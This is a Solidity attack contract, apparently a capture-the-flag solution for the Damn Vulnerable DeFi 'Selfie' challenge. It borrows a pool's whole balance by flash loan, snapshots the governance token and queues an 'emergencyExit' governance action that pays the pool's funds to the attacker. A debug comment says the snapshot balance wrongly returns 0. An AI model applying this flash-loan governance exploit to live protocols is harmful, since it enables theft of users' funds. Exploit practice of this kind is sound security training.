// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.15;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract AttackSelfie {
    address payable owner;
    SelfiePool public immutable pool;
    DamnValuableTokenSnapshot public immutable governanceToken;

    constructor(address _governanceTokenAddress, address _poolAddress) {
        governanceToken = DamnValuableTokenSnapshot(_governanceTokenAddress);
        pool = SelfiePool(_poolAddress);
        owner = payable(msg.sender);
    }

    function attack() external {
        uint256 currBalance = pool.token().balanceOf(address(pool));
        address token = address(pool.token());
        IERC3156FlashBorrower reciever = IERC3156FlashBorrower(address(this));
        pool.flashLoan(reciever, token, currBalance, "");
    }

    function onFlashLoan(
        address initiator, 
        address _token, 
        uint256 _amount,
        uint256 _fee, 
        bytes calldata data
    ) external returns (bytes32) {
        require(initiator == address(this), "Initiator should be this contract");

        governanceToken.snapshot();

        uint256 bal = governanceToken.getBalanceAtLastSnapshot(address(this));

        // this is returning 0, which it should not.
        console.log(bal);

        pool.governance().queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );

        governanceToken.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}